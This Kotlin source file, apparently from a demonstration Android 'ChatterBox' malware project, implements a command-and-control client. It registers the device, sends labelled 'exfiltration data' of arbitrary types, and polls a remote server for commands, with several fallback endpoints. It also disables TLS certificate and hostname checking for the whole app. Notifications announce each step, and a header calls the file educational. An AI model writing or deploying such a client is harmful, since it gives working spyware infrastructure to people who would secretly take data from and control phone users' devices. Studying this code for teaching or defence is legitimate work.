package com.example.ChatterBox.malicious

import android.content.Context
// AsyncTask is deprecated, but using for compatibility
import android.os.AsyncTask
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import java.util.UUID
// For notifications
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import androidx.core.app.NotificationCompat

/**
 * Client for communicating with the Command and Control (C2) server.
 * Handles device registration, data exfiltration, and command retrieval.
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class C2Client(private val context: Context) {
    private val TAG = "C2Client"
    private var deviceId: String? = null
    private val CHANNEL_ID = "c2_channel"
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    private var notificationCounter = 0
    
    init {
        // Trust all SSL certificates for the demo
        // NOTE: This is extremely insecure and should NEVER be done in a real app!
        // This is only done here to simplify the demo without proper certificate handling
        trustAllCertificates()
        
        // Generate or retrieve device ID
        deviceId = getOrCreateDeviceId()
        
        // Create notification channel for Android O and above
        createNotificationChannel()
        
        // Log initialization for debugging
        Log.d(TAG, "C2Client initialized with deviceId: $deviceId")
        Log.d(TAG, "Using HTTPS endpoint: ${C2Config.SERVER_URL}")
        Log.d(TAG, "Using HTTP endpoint: ${C2Config.HTTP_SERVER_URL}")
        Log.d(TAG, "Using local endpoint: ${C2Config.LOCAL_SERVER_URL}")
    }
    
    /**
     * Register the device with the C2 server
     */
    fun registerDevice() {
        Log.d(TAG, "Registering device with C2 server")
        
        // Show notification
        showNotification("Device Registration", "Connecting to C2 server...")
        
        val registrationData = JSONObject().apply {
            put("device_id", deviceId)
            put("device_info", JSONObject().apply {
                put("model", android.os.Build.MODEL)
                put("manufacturer", android.os.Build.MANUFACTURER)
                put("android_version", android.os.Build.VERSION.RELEASE)
                put("sdk_level", android.os.Build.VERSION.SDK_INT)
                put("device_name", android.os.Build.DEVICE)
            })
            put("app_version", context.packageManager.getPackageInfo(context.packageName, 0).versionName)
            put("registration_time", System.currentTimeMillis())
        }
        
        // Log the data we're going to send for debugging
        Log.d(TAG, "Registration data: ${registrationData.toString()}")
        
        // Try HTTPS endpoint first
        Log.d(TAG, "Trying HTTPS endpoint: ${C2Config.REGISTRATION_ENDPOINT}")
        SendDataTask(C2Config.REGISTRATION_ENDPOINT, registrationData.toString()).execute()
        
        // Try HTTP endpoint as fallback
        Log.d(TAG, "Trying HTTP endpoint: ${C2Config.HTTP_REGISTRATION_ENDPOINT}")
        SendDataTask(C2Config.HTTP_REGISTRATION_ENDPOINT, registrationData.toString()).execute()
        
        // Also try local endpoint as final fallback
        Log.d(TAG, "Trying local endpoint: ${C2Config.LOCAL_SERVER_URL}/register")
        SendDataTask("${C2Config.LOCAL_SERVER_URL}/register", registrationData.toString()).execute()
        
        // Try direct IP address as extreme fallback
        // This will help diagnose if there's a DNS resolution issue
        Log.d(TAG, "Trying direct IP endpoint: http://127.0.0.1:42069/register")
        SendDataTask("http://127.0.0.1:42069/register", registrationData.toString()).execute()
    }
    
    /**
     * Send collected data to the C2 server
     */
    fun sendExfiltrationData(dataType: String, data: String) {
        Log.d(TAG, "Sending exfiltration data to C2 server: $dataType")
        
        // Show notification
        showNotification("Data Exfiltration", "Sending $dataType data to C2 server...")
        
        val exfilData = JSONObject().apply {
            put("device_id", deviceId)
            put("type", dataType)
            put("timestamp", System.currentTimeMillis())
            put("data", data)
        }
        
        val jsonStr = exfilData.toString()
        
        // Log for debugging
        Log.d(TAG, "Exfiltration data (first 100 chars): ${jsonStr.take(100)}...")
        
        // Try HTTPS endpoint first
        Log.d(TAG, "Trying HTTPS exfil endpoint: ${C2Config.EXFILTRATION_ENDPOINT}")
        SendDataTask(C2Config.EXFILTRATION_ENDPOINT, jsonStr).execute()
        
        // Try HTTP endpoint as fallback
        Log.d(TAG, "Trying HTTP exfil endpoint: ${C2Config.HTTP_EXFILTRATION_ENDPOINT}")
        SendDataTask(C2Config.HTTP_EXFILTRATION_ENDPOINT, jsonStr).execute()
        
        // Try local endpoint as final fallback
        Log.d(TAG, "Trying local exfil endpoint: ${C2Config.LOCAL_SERVER_URL}/exfil")
        SendDataTask("${C2Config.LOCAL_SERVER_URL}/exfil", jsonStr).execute()
        
        // Try direct IP as extreme fallback
        Log.d(TAG, "Trying direct IP exfil endpoint: http://127.0.0.1:42069/exfil")
        SendDataTask("http://127.0.0.1:42069/exfil", jsonStr).execute()
    }
    
    /**
     * Check for new commands from the C2 server
     */
    fun checkForCommands(callback: (List<String>) -> Unit) {
        Log.d(TAG, "Checking for commands from C2 server")
        
        // Show notification
        showNotification("Command Polling", "Checking for new commands...")
        
        // Create a simple request with just the device ID
        val requestData = JSONObject().apply {
            put("device_id", deviceId)
            put("timestamp", System.currentTimeMillis())
        }
        
        val requestStr = requestData.toString()
        
        // Log for debugging
        Log.d(TAG, "Command request data: $requestStr")
        
        // Try HTTPS endpoint first
        Log.d(TAG, "Trying HTTPS command endpoint: ${C2Config.COMMAND_ENDPOINT}")
        GetCommandsTask(callback, C2Config.COMMAND_ENDPOINT).execute(requestStr)
        
        // Try HTTP endpoint as fallback
        Log.d(TAG, "Trying HTTP command endpoint: ${C2Config.HTTP_COMMAND_ENDPOINT}")
        GetCommandsTask(callback, C2Config.HTTP_COMMAND_ENDPOINT).execute(requestStr)
        
        // Try local endpoint as final fallback
        Log.d(TAG, "Trying local command endpoint: ${C2Config.LOCAL_SERVER_URL}/command")
        GetCommandsTask(callback, "${C2Config.LOCAL_SERVER_URL}/command").execute(requestStr)
        
        // Try direct IP as extreme fallback
        Log.d(TAG, "Trying direct IP command endpoint: http://127.0.0.1:42069/command")
        GetCommandsTask(callback, "http://127.0.0.1:42069/command").execute(requestStr)
    }
    
    /**
     * Create a notification channel for Android O and above
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "C2 Communication"
            val descriptionText = "Shows C2 server communication attempts"
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
            }
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    /**
     * Show a temporary notification for C2 communication
     */
    private fun showNotification(title: String, content: String) {
        // Increment the notification counter to ensure unique IDs
        notificationCounter++
        
        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(content)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
        
        // Show the notification
        notificationManager.notify(notificationCounter, builder.build())
        
        // Auto-dismiss after 3 seconds
        android.os.Handler().postDelayed({
            notificationManager.cancel(notificationCounter)
        }, 3000)
    }
    
    /**
     * Get or create a unique device ID
     */
    private fun getOrCreateDeviceId(): String {
        val prefs = context.getSharedPreferences("c2_prefs", Context.MODE_PRIVATE)
        val existingId = prefs.getString("device_id", null)
        
        if (existingId != null) {
            return existingId
        }
        
        // Generate a new UUID if we don't have one
        val newId = UUID.randomUUID().toString()
        prefs.edit().putString("device_id", newId).apply()
        return newId
    }
    
    /**
     * Trust all SSL certificates for the demo
     * WARNING: This is extremely insecure and should NEVER be done in a real app!
     * This is only done here to simplify the demo without proper certificate handling
     */
    private fun trustAllCertificates() {
        try {
            val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
                override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                override fun checkClientTrusted(certs: Array<X509Certificate>, authType: String) {}
                override fun checkServerTrusted(certs: Array<X509Certificate>, authType: String) {}
            })
            
            val sc = SSLContext.getInstance("TLS")
            sc.init(null, trustAllCerts, SecureRandom())
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
            HttpsURLConnection.setDefaultHostnameVerifier { _, _ -> true }
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up SSL trust", e)
        }
    }
    
    /**
     * Gets the app version string for user agent
     */
    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }
    
    /**
     * AsyncTask to send data to the C2 server
     * Note: AsyncTask is deprecated but still used for compatibility
     */
    @Suppress("DEPRECATION")
    private inner class SendDataTask(
        private val endpoint: String,
        private val jsonData: String
    ) : AsyncTask<Void, Void, Pair<Boolean, String>>() {
        
        override fun doInBackground(vararg params: Void): Pair<Boolean, String> {
            try {
                val url = URL(endpoint)
                // Properly handle HTTP vs HTTPS connections
                val connection = if (endpoint.startsWith("https")) {
                    url.openConnection() as HttpsURLConnection
                } else {
                    url.openConnection() as HttpURLConnection
                }
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.connectTimeout = 15000 // 15 seconds timeout
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true
                
                // Log the connection details for debugging
                Log.d(TAG, "Connecting to: $endpoint")
                Log.d(TAG, "Sending data (first 100 chars): ${jsonData.take(100)}...")
                
                try {
                    // Write the JSON data
                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonData)
                        writer.flush()
                    }
                    
                    // Check the response
                    val responseCode = connection.responseCode
                    Log.d(TAG, "C2 server response code: $responseCode for $endpoint")
                    
                    // Read the response data
                    var responseData = ""
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        val reader = BufferedReader(InputStreamReader(connection.inputStream))
                        var line: String?
                        val response = StringBuilder()
                        while (reader.readLine().also { line = it } != null) {
                            response.append(line)
                        }
                        responseData = response.toString()
                        Log.d(TAG, "Server response: $responseData")
                    } else {
                        // Try to read error response
                        try {
                            val reader = BufferedReader(InputStreamReader(connection.errorStream))
                            var line: String?
                            val response = StringBuilder()
                            while (reader.readLine().also { line = it } != null) {
                                response.append(line)
                            }
                            responseData = response.toString()
                            Log.e(TAG, "Server error response from $endpoint: $responseData")
                        } catch (e: Exception) {
                            Log.e(TAG, "Could not read error response from $endpoint", e)
                        }
                    }
                    
                    return Pair(responseCode == HttpURLConnection.HTTP_OK, responseData)
                } catch (e: Exception) {
                    Log.e(TAG, "Error during connection to $endpoint", e)
                    return Pair(false, "Error: ${e.message}")
                } finally {
                    try {
                        connection.disconnect()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error disconnecting from $endpoint", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error creating connection to $endpoint", e)
                return Pair(false, "Connection Error: ${e.message}")
            }
        }
        
        override fun onPostExecute(result: Pair<Boolean, String>) {
            val (success, responseData) = result
            
            Log.d(TAG, "Data sent to $endpoint: $success, response: $responseData")
            
            // Show result notification
            if (success) {
                showNotification("C2 Communication Success", "Connected to server: ${endpoint.substringBefore("/", endpoint)}")
                Log.d(TAG, "Successfully communicated with server: $endpoint")
            } else {
                showNotification("C2 Communication Failed", "Failed to connect to ${endpoint.substringBefore("/", endpoint)}")
                Log.e(TAG, "Failed to communicate with server: $endpoint - $responseData")
            }
        }
    }
    
    /**
     * AsyncTask to retrieve commands from the C2 server
     * Note: AsyncTask is deprecated but still used for compatibility
     */
    @Suppress("DEPRECATION")
    private inner class GetCommandsTask(
        private val callback: (List<String>) -> Unit,
        private val endpoint: String
    ) : AsyncTask<String, Void, Pair<List<String>, String>>() {
        
        override fun doInBackground(vararg params: String): Pair<List<String>, String> {
            if (params.isEmpty()) return Pair(emptyList(), "No parameters provided")
            
            try {
                val url = URL(endpoint)
                Log.d(TAG, "Connecting to command endpoint: ${url}")
                
                // Properly handle HTTP vs HTTPS connections
                val connection = if (endpoint.startsWith("https")) {
                    url.openConnection() as HttpsURLConnection
                } else {
                    url.openConnection() as HttpURLConnection
                }
                
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.connectTimeout = 15000 // 15 seconds timeout
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true
                
                try {
                    // Write the request data
                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(params[0])
                        writer.flush()
                    }
                    
                    // Read the response
                    val responseCode = connection.responseCode
                    if (responseCode != HttpURLConnection.HTTP_OK) {
                        Log.e(TAG, "Error response from C2 server at $endpoint: $responseCode")
                        return Pair(emptyList(), "Error: HTTP $responseCode")
                    }
                    
                    // Parse the JSON response
                    val reader = BufferedReader(InputStreamReader(connection.inputStream))
                    val response = StringBuilder()
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        response.append(line)
                    }
                    
                    val responseStr = response.toString()
                    Log.d(TAG, "Command response from $endpoint: $responseStr")
                    
                    // Extract commands from the response
                    val commands = mutableListOf<String>()
                    try {
                        val jsonResponse = JSONObject(responseStr)
                        
                        // Check for error response
                        if (jsonResponse.has("status") && jsonResponse.getString("status") == "error") {
                            Log.e(TAG, "Error from C2 server: ${jsonResponse.optString("message", "Unknown error")}")
                            return Pair(emptyList(), "Error: ${jsonResponse.optString("message", "Unknown error")}")
                        }
                        
                        // Handle "commands" field that contains either an array or object
                        if (jsonResponse.has("commands")) {
                            Log.d(TAG, "Found commands field in response")
                            val commandsObj = jsonResponse.get("commands")
                            
                            if (commandsObj is JSONObject) {
                                // If it's an object, parse each command type
                                val keys = jsonResponse.getJSONObject("commands").keys()
                                while (keys.hasNext()) {
                                    val key = keys.next()
                                    commands.add(key)
                                }
                            } else if (jsonResponse.get("commands") is String) {
                                // If it's a string, just add it
                                commands.add(jsonResponse.getString("commands"))
                            } else {
                                // If it's an array, add each command string or parse command objects
                                try {
                                    val commandsArray = jsonResponse.getJSONArray("commands")
                                    Log.d(TAG, "Found ${commandsArray.length()} commands in array")
                                    
                                    for (i in 0 until commandsArray.length()) {
                                        try {
                                            val cmdObj = commandsArray.getJSONObject(i)
                                            if (cmdObj.has("command")) {
                                                val cmd = cmdObj.getString("command")
                                                Log.d(TAG, "Found command: $cmd")
                                                commands.add(cmd)
                                            }
                                        } catch (e: Exception) {
                                            // If not a JSON object, try as a string
                                            try {
                                                val cmd = commandsArray.getString(i)
                                                Log.d(TAG, "Found string command: $cmd")
                                                commands.add(cmd)
                                            } catch (ex: Exception) {
                                                Log.e(TAG, "Error parsing command at index $i", ex)
                                            }
                                        }
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error parsing commands array", e)
                                }
                            }
                        } else {
                            Log.d(TAG, "No commands field found in response")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing commands from response: ${e.message}")
                        return Pair(emptyList(), "Parse error: ${e.message}")
                    }
                    
                    return Pair(commands, responseStr)
                } catch (e: Exception) {
                    Log.e(TAG, "Error during command request to $endpoint: ${e.message}")
                    return Pair(emptyList(), "Request error: ${e.message}")
                } finally {
                    try {
                        connection.disconnect()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error disconnecting from $endpoint", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error creating connection to $endpoint: ${e.message}")
                return Pair(emptyList(), "Connection error: ${e.message}")
            }
        }
        
        override fun onPostExecute(result: Pair<List<String>, String>) {
            val (commands, responseData) = result
            
            Log.d(TAG, "Retrieved ${commands.size} commands from C2 server: $endpoint")
            Log.d(TAG, "Response data: $responseData")
            
            // Show result notification
            if (commands.isNotEmpty()) {
                showNotification("Commands Received", "Received ${commands.size} commands from server: ${endpoint.substringBefore("/", endpoint)}")
                
                // Log each command for debugging
                commands.forEachIndexed { index, command ->
                    Log.d(TAG, "Command $index: $command")
                }
            } else {
                showNotification("No Commands", "No new commands from ${endpoint.substringBefore("/", endpoint)}")
            }
            
            // Only call the callback if we have commands
            if (commands.isNotEmpty()) {
                callback(commands)
            }
        }
    }
}
